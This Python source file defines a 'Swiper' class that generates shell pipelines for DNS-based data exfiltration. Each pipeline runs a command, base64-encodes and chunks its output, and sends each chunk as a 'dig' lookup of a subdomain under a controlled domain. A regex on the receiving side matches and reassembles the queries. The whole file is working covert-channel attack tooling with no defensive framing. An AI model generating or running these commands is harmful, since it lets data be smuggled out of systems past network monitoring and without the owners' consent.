import binascii
import re
import uuid


class Swiper:
    __INSTANCE = None

    def __init__(self, domain: str):
        host: bytes = domain.encode("ascii")
        host = host[:-1] if host[-1] == b"." else host
        host = host[1:] if host[0] == b"." else host
        self.schema = re.compile(rb"(?:([a-zA-Z0-9_\-=]+).([1-9][0-9]*)|([1-9][0-9]*).0).([0-9a-fA-F]{32})\." + host + rb"\.")
        self.domain = host

    @staticmethod
    def instance(*args, **kwargs):
        if Swiper.__INSTANCE is None:
            Swiper.__INSTANCE = Swiper(*args, **kwargs)
        return Swiper.__INSTANCE

    @property
    def host(self):
        return self.domain.decode("ascii")

    @staticmethod
    def generate_context():
        return binascii.b2a_hex(uuid.uuid4().bytes).decode("ascii")

    def _dns(self, context: str, dns_cmd: str, template: str):
        return f"{dns_cmd} {template}.{context}.{self.host}"

    def _generate_cmd(self, dns_cmd: str, context: str, payload: str = None, metadata: bool = None):
        if not payload:
            payload = "$CMD"
        if metadata is not False:
            metadata = True
        cmd = f"{payload} | base64 -w 60 | cat -n"
        if metadata:
            cmd += f" | tee >(wc -l | xargs -L 1 -n 1 bash -c '{self._dns(context, dns_cmd, '$0.0')}')"
        return cmd + f" | awk '{{$1=$1}};1' | sed 's/ /\\n/' | xargs -L 2 -n 2 bash -c '{self._dns(context, dns_cmd, '$1.$0')}'"

    def generate_dig(self, context: str, payload: str, metadata: bool):
        return self._generate_cmd("dig @localhost", context, payload, metadata)

    def dns_match(self, host: bytes):
        return self.schema.match(host)
